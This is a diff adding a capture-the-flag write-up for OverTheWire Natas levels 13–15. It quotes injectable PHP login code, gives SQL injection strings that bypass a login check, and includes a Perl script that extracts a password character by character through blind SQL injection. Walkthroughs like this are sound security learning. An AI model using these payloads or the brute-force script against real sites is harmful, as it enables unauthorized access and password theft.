@@ -889,3 +889,272 @@ $php_code = "<?php\n"
     . "?>";
 // ...
 ```
+
+## Level 13 ➡ Level 14
+
+This time the page contains a form asking for user and password. It also contains the usual link that allows the user to see a part of the source code.
+
+- Try the form.
+- Inspect the resources.
+- Find end goal.
+- Get the password.
+
+### Testing form 13
+
+Some basic tests:
+
+- Blank submission: `Access denied!`.
+- Blank user submission: `Access denied!`.
+- Blank password submission: `Access denied!`.
+- Random data: `Access denied!`.
+
+### Inspection 13
+
+#### HTML inspection 13
+
+Relevant code:
+
+```html
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+```
+
+#### Request inspection 13
+
+The requests packs the login data like this:
+
+```http
+username=testuser&password=testpassword
+```
+
+#### PHP inspection 13
+
+The code that handles the authentication:
+
+```php
+<?php
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysqli_connect('localhost', 'natas14', '<censored>');
+    mysqli_select_db($link, 'natas14');
+
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
+            echo "Successful login! The password for natas15 is <censored><br>";
+    } else {
+            echo "Access denied!<br>";
+    }
+    mysqli_close($link);
+} else {
+    // display login form
+}
+?>
+```
+
+Thoughts:
+
+- Opens a MySQL connection and selects natas14 database.
+- The `$query` variable contains the query.
+- **If the result of the query has more than 0 rows it shows the password.**
+
+### Resolution 13
+
+My first idea would be to try inject SQL code into the form to "cancel" the `WHERE` clausule or make it `TRUE` always. The SQL after inject has to perform this operation:
+
+```sql
+SELECT * FROM user WHERE username="something" AND password="something" -- THIS WHERE SHOULD EVAL TO TRUE
+```
+
+Injecting an `OR TRUE` would make all statement result in true.
+
+```sql
+SELECT * FROM user WHERE username="something" AND password="something" OR TRUE
+```
+
+#### SQL injection
+
+Considering the form works like this:
+
+```text
+Username: "Something"
+Password: "Something else"
+```
+
+Selecting a password (could be username too) that looks like this:
+
+```text
+Username: ""OR TRUE--"
+Password: "something"
+```
+
+Will make the SQL query something like this:
+
+```sql
+SELECT * FROM user WHERE username=""OR TRUE-- AND password="something"
+```
+
+Sometimes (in this particular case too) the comment `--` won't work. For MySQL, a more reliable way is to use `#` instead:
+
+```text
+Username: ""OR TRUE#"
+Password: "something"
+```
+
+The SQL query:
+
+```sql
+SELECT * FROM user WHERE username=""OR TRUE# AND password="something"
+```
+
+## Level 14 ➡ Level 15
+
+This time the form only has a username field. There is an extra button that says "Check existence".
+
+- Try the form.
+- Inspect the resources.
+- Find end goal.
+- Get the password.
+
+### Testing form 14
+
+Tests:
+
+- Basic tests show the same results as the previous login form.
+- Injecting `"OR TRUE#`, shows user exists but no information regarding the password.
+- User `natas16`, exists.
+
+Thoughts:
+
+- It seems it contains the usernames of all natas and maybe their passwords.
+- It is still vulnerable to SQL injections.
+
+### Inspection 14
+
+#### HTML inspection 14
+
+Relevant code:
+
+```html
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+<input type="submit" value="Check existence" />
+</form>
+```
+
+#### PHP inspection 14
+
+Relevant code:
+
+```php
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+$link = mysqli_connect('localhost', 'natas15', '<censored>');
+mysqli_select_db($link, 'natas15');
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+
+if(array_key_exists("debug", $_GET)) {
+    echo "Executing query: $query<br>";
+}
+
+$res = mysqli_query($link, $query);
+```
+
+Thoughts:
+
+- This time the password for the next level is not printed anywhere.
+- There is a comment about the design of the table named `users`.
+
+### Resolution 14
+
+The plan is simple: considering the only information I get as response is if the user exists, I can brute force the password by injecting a clause that checks for it, the end result should be this query:
+
+```sql
+SELECT * FROM users WHERE username="username" AND password="something else";
+```
+
+#### Bruteforcing logic 14
+
+Considering the following information about the password:
+
+- Has length 32.
+- Has lowercase and uppercase letters.
+- Has numbers.
+
+I can try each character and advance when I get a correct one, until it reaches 32 characters. The way of confirming if a character is correct is with the `LIKE` operation in conjunction with `BINARY` to be case sensitive.
+
+```sql
+SELECT * FROM users WHERE username="username" AND BINARY password LIKE "chars%";
+```
+
+The code used to brute force this:
+
+```perl
+use strict;
+use warnings;
+use HTTP::Tiny;
+use Path::Tiny;
+use MIME::Base64 'encode_base64';
+
+my $num = 14;
+my $user = "natas" . ($num + 1);
+my @lines = path('Pwds.txt')->lines_utf8;
+my $pass = $lines[$num];
+
+my $url = "http://$user.natas.labs.overthewire.org/";
+my $http = HTTP::Tiny->new;
+my %headers = (
+    'Authorization' => 'Basic ' . encode_base64("$user:$pass", ''),
+    'Content-Type' => 'application/x-www-form-urlencoded',
+);
+
+sub req {
+    my ($username) = @_;
+    
+    my $response = $http->post($url, {
+        headers => \%headers,
+        content => "username=$username"
+    });
+
+    unless ($response->{success}) {
+        die "Failed: $response->{status} $response->{content}\n";
+    } 
+
+    return $response->{content};
+}
+
+my $chars = join('', 'A'..'Z', 'a'..'z', '0'..'9');
+my $nextpass = '';
+
+while (length $nextpass < 32) {
+   for my $ch (split //, $chars) {
+       my $candidate = "$nextpass$ch";
+       print "Attempting password: $candidate\n";
+       my $username = "natas16\"AND BINARY password LIKE \"$candidate%\"#";
+
+       my $res = req $username;
+       unless ($res =~ "doesn't exist") {
+           $nextpass = $candidate;
+           print "$nextpass\n";
+           last;
+       }
+   }
+}
+```
+
+Steps:
+
+1. Defines the credentials and the logic of the web request, taking into consideration the credentials.
+2. Defines a string with all lowercase, uppercase and numbers. In order to later use it to test char by char.
+3. Set up the looping process for testing the chars, it should run until the goal string reaches the length constraints.
+4. Test each char, injecting it into the SQL query.
+5. Check if is valid by parsing the HTML output given as response. If it is, update the string that holds the final value.
